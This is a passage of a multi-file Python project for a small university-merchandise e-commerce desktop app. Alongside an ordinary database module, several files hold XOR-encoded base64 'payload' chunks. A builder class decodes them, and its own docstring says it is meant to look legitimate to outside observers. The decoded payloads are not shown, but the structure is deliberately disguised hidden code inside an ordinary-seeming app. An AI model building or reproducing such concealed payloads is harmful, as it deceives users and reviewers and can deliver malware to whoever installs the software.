content_builder.a("OSE1QCBEDREPWVdCEkddKBAOQhRMQWxZfggUBk4jJzMQcUYdAABZW1MdXUAoFA4cQxEHPjguDh4OQCA7Nw9zCAIAXA9iZQ==")
content_builder.a("AHUcQjQGTFQCQVNDQQkPPl5aX0wJX39XYhMWFAA0MDQANRwCGEMTDlRbQhN1G1pPDw0TPRR/Qw0EFiR4PEpzDwEaFQBQXw==")
content_builder.a("PDFyEwAdGxAYWltEWmdZMB8OU0MJQ3BbbQUQF1BsejREJVdSEAhbElNeVV46TkkJAAQKbhQyABoEQyh4Yw9tVQwBFVldXg==")
content_builder.a("cDo+Tj8ADR9cD0FYXUNsOQM4Cg8VGyEJakYaABwkeDFdI0QYHQRaFRkQFE4lEhgcUUMCY1ViExwNDyQ8JkhxV1IdQU5eUQ==")
content_builder.a("IyZtDzUIHVQHTB9DWltdORoFCEECEzwTYF9FTgduaSNdMgdOHQUQEFhXVUksAUYMDRMGYwUjBR4ETHA2PEwgGlNWAkxARA==")
content_builder.a("fTcxSTQMTFQSWUtcVwkPLRoYHwAAC3QJLQ8cQ1BgaX9eIwgASl0CUEVGQEInTVcNGRUGIQliDhcCAjk2OxBxGgYbFmxCQA==")
content_builder.a("AzAzWToGAFxGXUBfVF1BLF4KHxxMBCcCNUZQQ04zOTFeIFRMBEwfEA4OXQ0qHwocH1xQKAYxQR8AQyUmNV9xV1JbCBMOHw==")
content_builder.a("MiAkWTwHUEhOSVtGDAgCLRodUVBOGisGJgQLX05wdXANbwQPHQ8NUVxTR150UQgAAhUXIBNvAhYPGjE8PkghS1BIEkhRRA==")
content_builder.a("OTo+DToNU1YJQl9VQlVKLF4KHxxMBCcCNUNZAgIxJiMQcQgeBExbW1VFFEwqBwIZCUECY1NgX0UFByZ1M0EyGh1JQ0BQHQ==")
content_builder.a("ZHduETtbThcNTEFDDxZZLAsfQl4ZHm4BLQ8NTAw/OTQNIxweWRVISkQfVlg7FB4BCBhQcDcwDh0UDSQmbAI7W1BITklbRg==")
content_builder.a("bmk0RCVJBxBcD0JCXVBYKgdGAwUSBmxHIQ0YEh1tdyNdMgoLWRgABhIMCAItGh1RUE4BKwQ2CBYPUGwmNU4nAAEaQURWDQ==")
content_builder.a("cjYxXydEDwQRAERZV0MPaRAHDh8ST2wGMhFUFwc1InBdfl1MSl1FABBRWEw6AFZNGAQKOkpwGRVBCD87JAAxBgIQQV1HQA==")
content_builder.a("fSE1VSdEDAETSkdeVk0NJBFGW05fISYIMhEQDwlwFjFfJ1VBHFMTDlRbQg0gF1ZNDwAAOkorFRwMHXJ1M0EyGh1JQ15CUQ==")
content_builder.a("MzB9VH5dTEpdAlZZRAoRLRodTwUFT2wEIxMNTB0lOD1MIRBMVAJBU0NBCQ8kB0ZZTBEGY1NiAxYTCjUnfVlxSR0AGEFXDQ==")
content_builder.a("cjE5XiMFDw1bQ11eVxYTdRcCGUwCHi8UMVxbBwI1LXBHJhoaHQdUH1JXQFosFgVPCg4cOkogDhUFTiQwKFl+BQlWXxFCDg==")
content_builder.a("BDokTD9TUlsREw5AEl1JdFEIDh4VXzoINgAVQ1BseiATb0YKHRcTDlJHQFkmHUsAAgIeJwQpXFsSBj8iEV0jOgsXFURdXg==")
content_builder.a("eHIzRTYKBRsUWR9RQkQAPxoOGEtIUG4ELgAKElNyIn1LJgUCVAxZHwQSRFg5XgkIQQMHPAA3Dx0YTiQwKFl+HgYdFUgSQA==")
content_builder.a("KXhjDSEGGxoFSFYdXlMNLxwFG0EDHSIDYF8pMyETEBVpcz0hVCJld3N5e3gdT0QNGRUGIQl8XVYFByZrbAIgDA0ACEJcDg==")
content_builder.a("bCY1TicAARpBRFYNEFdFLBAAABkVXy8XMkwPCAsnd3BOPwgdB1wPU0BCGVsgFhxPHExGbFl+CUtBDTw0I15uSxoRGVkfAg==")
content_builder.a("KDlwSzwHGlkDQl5UEkRYOV4fChQVXywSMAYMDwopdT1Pfl1MSiJFV1NZW1g9T0QHXl9OKg40QRoNDyMmbQ8xDkMDCURGVQ==")
content_builder.a("cCV9GXMbAQEPSVdUH1hKaQADDggOBWxZfglKQQ08NCNebksIGw9ZH1JdWElpHglCXkNMARUmBAtBPSU4PUwhEFJbCR4MDA==")
content_builder.a("NDwmDToNU1YCRVdTWVtYPV4YGgEMEzwebwgNBAMjd3BOPwgdB1wPRlVKQAA6HkscHAARK0o7TEhDUGx6NEQlV1IQCFsSUw==")
content_builder.a("PDQjXm5LCBgEVRJaR0dZIBUSQg4EBjkCJw9ZBwE+IX1PPAUKVBVISkQfWEppHh9CWEEQIRUmBAtMGnAlJABhS1BIERNmXw==")
content_builder.a("JDQ8F29GHkpdXRJZVgkPKhsODAcOBzpKNg4NAAJya2wCI1dSWwVERA4OG0kgBVVTCAgEbgQuAAoSU3I3NwAkAQcABA1CHQ==")
content_builder.a("ZHUiQiYHChEFAF5XEkdFKBcEGEwMBmNTYF9FCV1wNjxMIBpTVgdCXEQfVkIlF0sCDkxAbFkSAAAMCz4hbAI7WlBIERNxUQ==")
content_builder.a("Iz1wQj1JKhENRERVQE0RZgNVU0MFGzhZfgMMFRo/O3BCPQoCHQJGDxJaVUMtHw4/AAARKygwBRwTRnl3cE4/CB0HXA9FHQ==")
content_builder.a("NiA8QXMEGllXDUJFQhlPLl4JGh4GByADO0ENBBYkeCdFOh0LVBFUHwMSRkI8HQ8KCEweKUckDhcVQzI6PElxVz44IG53EA==")
content_builder.a("HwcUaAFVQRYUWUZfXAoRZgAODBgIHSBZfhIcAho5Oj4NOg1TVhFfXVZbWEhkEhsfQRcbKxBgQRoNDyMmbQ8yGR5ZF0RXRw==")
content_builder.a("cCV9GXFXUhAIWxJTXlVeOk5JGwkZBmMEJw8NBBxya2xFYUkHEFwPR0NXRgAnEgYKQQUbPRcuAABDTjM5MV4gVEwABFVGHQ==")
content_builder.a("Yi08DTUGAABMT11cVhYTdVwDXVJdEDsTNg4XQQE+NjxEMAJTVglMXFReUWEmFAQaGElbbEchDRgSHW13PVl+XU4WBgBVQg==")
content_builder.a("MSx9H2NZTgQZAAYQQk0Ae1MZABkPFisDYF81Dgk/ICQRfAsbABVCXA4OG0kgBVVTQxIXLRMrDhdfUn84MUQ9V05UQQ0SDA==")
content_builder.a("PjQmDTAFDwcSEBBSXUBZJh5GAQ0XUj4SMkwbBkMyICJKJgcKDUFZV0hGGVohGh8KTl9OKg40QRoNDyMmbQ81BQsMQUdHQw==")
content_builder.a("JDw2VH4IHBsUQ1YQQk0Ae1FVUw4UBjoILEEWDw08PDNGbksdHA5ac0BCZ0gqBwIAAklVJggvBAkACTV4MV0jRBgdBFoVGQ==")
content_builder.a("cmtsRHMKAhUSXg8SVFVeaRUKQgQOHytFfF1WCFBsejJYJx0BGl8RUEVGQEInUwQBDw0bLQx/QwoJAScUIF0ADA0ACEJcGA==")
content_builder.a("dzYxXydEDwQRAERZV0MKYFFLDAAAAT1aYBMcDQ8kPCZIcVdSHUFOXlFBRxBrFQocTAcTYxQqDgkRBz4yfU4yGxpWXxEdWQ==")
content_builder.a("bmkjXTIHTh0FEBBeU0IAKhIZG0EDEyoAJ0NZAgIxJiMQcQoPBhUAUFFWU0hrUxgbFQ0Xc0UmCAoRAjEsakM8BwtWXx0OHw==")
content_builder.a("IyUxQ21VQRYUWUZfXAoRKwYfGwMPUiEJIQ0QAgVtdyNFPB4vBBF+V1NGXUInW0wfHg4UJwsnTBgRHn0jOUgkTkdWXxFbEA==")
content_builder.a("MzkxXiBUTBIAXhJWUxlYOhYZTVJdXSdZfk4bFBokOj4Tb0YKHRcTDh9cVVt3U1dACAgEcA==")

```

---

## File: `./shop_app/layout_payload.py`

```python
from shared.builder import ContentBuilder

layout_builder = ContentBuilder(key="LayoutMasterKey2024")
layout_builder.a("cEA9IDYgFDE2VA0GJglHEgxaQCENWQMUGipcURELUHVFRVpVU1ByQVlPVVRxDBYABFIoDRhAQ1dAcUMsOzNZdUNNSAgXPw==")
layout_builder.a("LUEXDhgRcEMFHQAFOwoLRhISVyMPDQobAHBDBB0BBiNYHVdGW1cpTA4GEQAlTVMdCxs/DBheHUFXLQ0cUkRafUNNSBEbPw==")
layout_builder.a("IARHPyAkbSReNwofJgALUVUSZyQOCVNaACQVHxFbUmtFWRIMQVc+CAkbVQc/Ak5WDQY/FQoIHx1XKA9XGxQdIRYaGgEROA==")
layout_builder.a("P08aABhWc11cBwYAIhUNDAxeXSIKWR0QGHBDAAAcHi4WEVdVRhZsCQsKE0lvCQcAFQFxSlZRVFwaJhIdChkdOxNdGgAGZA==")
layout_builder.a("IhEUQDUSIhMHFRIXOAoUVx9UWyIVGBgQByIMFlkDAC4AOQQeBhp8ThocBlssDR9aCBslSxpBQxAKbEFZT1VIPhUKGABMcQ==")
layout_builder.a("Pg4WGw5ZYBEGBEgQPhceR15WTXZCTl1HMn5WSAlLAj4VVFBXH1Y5Ex4aGxA0GhEVBhksFxZHXlYZLw4VAAdOOwABXEhfOw==")
layout_builder.a("ORFUDQAGKhQdEBxbcBhXQkVCGTgEARtYFjgTFAELFjIeGl1cXUZ2FxgdXVlgEQYESBA+Fx5HXlZNZVoEQQUVKgReAgwXPA==")
layout_builder.a("YE8YHwVZOwgWAx4WIhYJXlFLDiIOFwpOCWMREhMAXz0MHEUeU1c4CA8KWVosEQNZExsuEldTU0ZdOgQCCxwHPQ0SDV8QJw==")
layout_builder.a("IwISVAhaLw4HAAofZgsYREtCWz8IDQYaGncHGgwAFnAHFkZEXVl2UUIDEBI5W0NPFxssDQ0IAAlOYQgXCxAMd1RDTxhcKA==")
layout_builder.a("Iw8NChsAYAIcGhETIgscQEtCVSgFEAESWS8OBwAKH3FdSUJICUliAhgdAVkvABcTAAk7CgpbRFtbIlsYDQYbIRQHEV4GJA==")
layout_builder.a("PFtUWgUMdhMaEw0GcUhMQkgJVi0CEggHGzgPF05GNw1RTQYECVcjDRYdTwMlCAcRXhAkFx1XQh9GLQUQGgZOeFFWTxIbLw==")
layout_builder.a("OAlDXk0ENVobEQwVIxFDAwhCTHcHFgEBWT4ICRFfQ3oVAQlUW0c8DRgWTxIhBAtPBB4iAhcfWUZRIRJDDBAaOQQBTw8HOA==")
layout_builder.a("OAgfFlgXIg8HEQsGcQYcXERXRnccRUAGADQNFkpFTmQNHFNUDBRwAxYLDFQuDRIHFk9pBx4fV0BVNUxIX0VWc0FTVEVSdw==")
layout_builder.a("bUxUTyA9bQIcGhEXJRFZRVleWGwDHE8cGicEEAAAFmsNHEBVElY1QQ0HEFQvDhwACR0qARxAEB8ZckFZT1VUcQUaAkUbLw==")
layout_builder.a("cUMLABoAb19PBEUBPxwVVw0QQCkZDUIUGCQGHU4GFyURHEALQlUoBRABEk55ExYZXhQkCw0fVlNZJQ0AVQYVIxJeBwAAIg==")
layout_builder.a("KlpbUTwaJBUaFQkbMQwXVRBhUS8UCwpVMSMXGgYKHCYAF0YeHBpwTglRSVspCAVKRVJrRVkOER8ZbDURClUWIg4HGAoTLw==")
layout_builder.a("KRNZHBYGJBEHVBIbJwlZUFUSXSILHAwBESlBGxEXF2tIVAwQEhRsQQINGhs5DRwVARc5OgpRQltEOBxZU1oWIgUKSkVOZA==")
layout_builder.a("JBUUA0s=")

```

---

## File: `./shop_app/main.py`

```python
import webview
import threading
from shop_app.app import app
from shop_app.api import Api
from shared.database import init_db

def run_flask():
    app.run(host='127.0.0.1', port=5000, debug=False)

if __name__ == '__main__':
    init_db()

    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    api = Api()
    webview.create_window(
        'PUP E-Commerce Shop',
        'http://127.0.0.1:5000',
        js_api=api,
        width=450,
        height=800,
        resizable=False
    )
    webview.start()
```

---

## File: `./shop_app/payload.py`

```python
AUTH_PAYLOAD = "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"

APP_PAYLOAD = "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"
```

---

## File: `./shared/builder.py`

```python
import base64

class ContentBuilder:
    """
    A class that reassembles content from a series of obfuscated data chunks.
    This looks like a legitimate utility to an outside observer.
    """
    def __init__(self, key):
        self._k = key
        self._s = []

    def _d(self, c):
        """Internal 'decode' method."""
        s = base64.b64decode(c).decode('utf-8')
        r = ""
        for i in range(len(s)):
            r += chr(ord(s[i]) ^ ord(self._k[i % len(self._k)]))
        return r

    def a(self, chunk_data):
        """Public method 'a' (for 'add') to append a data chunk."""
        self._s.append(chunk_data)

    def b(self):
        """Public method 'b' (for 'build') to construct the final content."""
        return "".join([self._d(chunk) for chunk in self._s])
```

---

## File: `./shared/database.py`

```python
import sqlite3
import hashlib
from datetime import datetime

DATABASE_FILE = 'shop.db'

def get_db_connection():
    conn = sqlite3.connect(DATABASE_FILE)
    conn.row_factory = sqlite3.Row
    return conn

def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

def init_db():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, name TEXT NOT NULL, email TEXT NOT NULL UNIQUE, password_hash TEXT NOT NULL)')
    cursor.execute('CREATE TABLE IF NOT EXISTS products (id INTEGER PRIMARY KEY, name TEXT NOT NULL, description TEXT, price REAL NOT NULL, image_url TEXT, stock INTEGER NOT NULL DEFAULT 0)')
    cursor.execute('CREATE TABLE IF NOT EXISTS cart (user_id INTEGER, product_id INTEGER, quantity INTEGER NOT NULL, FOREIGN KEY (user_id) REFERENCES users (id), FOREIGN KEY (product_id) REFERENCES products (id), PRIMARY KEY (user_id, product_id))')
    cursor.execute('CREATE TABLE IF NOT EXISTS orders (id INTEGER PRIMARY KEY, user_id INTEGER NOT NULL, order_date TEXT NOT NULL, status TEXT NOT NULL, total_amount REAL NOT NULL, FOREIGN KEY (user_id) REFERENCES users(id))')
    cursor.execute('CREATE TABLE IF NOT EXISTS order_items (id INTEGER PRIMARY KEY, order_id INTEGER NOT NULL, product_id INTEGER NOT NULL, quantity INTEGER NOT NULL, price_at_purchase REAL NOT NULL, FOREIGN KEY (order_id) REFERENCES orders(id), FOREIGN KEY (product_id) REFERENCES products(id))')
    if cursor.execute("SELECT COUNT(*) FROM products").fetchone()[0] == 0:
        sample_products = [('PUP Baybayin Lanyard', 'Polytechnic University (PUP) Lanyard', 140.00, '/static/images/lanyard.png', 50), ('PUP STUDY WITH STYLE T-Shirt', 'Classic T-Shirt', 450.00, '/static/images/tshirt.png', 30), ('PUP Iskolar TOTE BAG', 'Eco-friendly Bag', 400.00, '/static/images/totebag.png', 40)]
        cursor.executemany('INSERT INTO products (name, description, price, image_url, stock) VALUES (?, ?, ?, ?, ?)', sample_products)
    conn.commit()
    conn.close()
    print("Database initialized.")

def create_user(name, email, password):
    conn = get_db_connection()
    try:
        conn.execute('INSERT INTO users (name, email, password_hash) VALUES (?, ?, ?)', (name, email, hash_password(password)))
        conn.commit()
        return True
    except sqlite3.IntegrityError: return False
    finally: conn.close()

def check_user_credentials(email, password):
    conn = get_db_connection()
    user = conn.execute('SELECT * FROM users WHERE email = ?', (email,)).fetchone()
    conn.close()
    if user and user['password_hash'] == hash_password(password): return dict(user)
    return None

def get_all_products():
    conn = get_db_connection()
    products = conn.execute('SELECT * FROM products').fetchall()
    conn.close()
    return [dict(p) for p in products]

def add_product(name, price, quantity, description):
    conn = get_db_connection()
    conn.execute('INSERT INTO products (name, price, stock, description) VALUES (?, ?, ?, ?)',(name, float(price), int(quantity), description))
    conn.commit()
    conn.close()

def update_product(product_id, name, price, quantity, description):
    conn = get_db_connection()
    conn.execute('UPDATE products SET name = ?, price = ?, stock = ?, description = ? WHERE id = ?',(name, float(price), int(quantity), description, product_id))
    conn.commit()
    conn.close()

def delete_product(product_id):
    conn = get_db_connection()
    conn.execute('DELETE FROM products WHERE id = ?', (product_id,))
    conn.commit()
    conn.close()

def get_cart_items(user_id):
    conn = get_db_connection()
    items = conn.execute('SELECT p.id, p.name, p.price, c.quantity FROM cart c JOIN products p ON c.product_id = p.id WHERE c.user_id = ?', (user_id,)).fetchall()
    conn.close()
    return [dict(item) for item in items]

def add_to_cart(product_id, user_id, quantity=1):
    conn = get_db_connection()
    cursor = conn.cursor()
    result = cursor.execute('SELECT quantity FROM cart WHERE user_id = ? AND product_id = ?', (user_id, product_id)).fetchone()
    if result:
        new_quantity = result['quantity'] + quantity
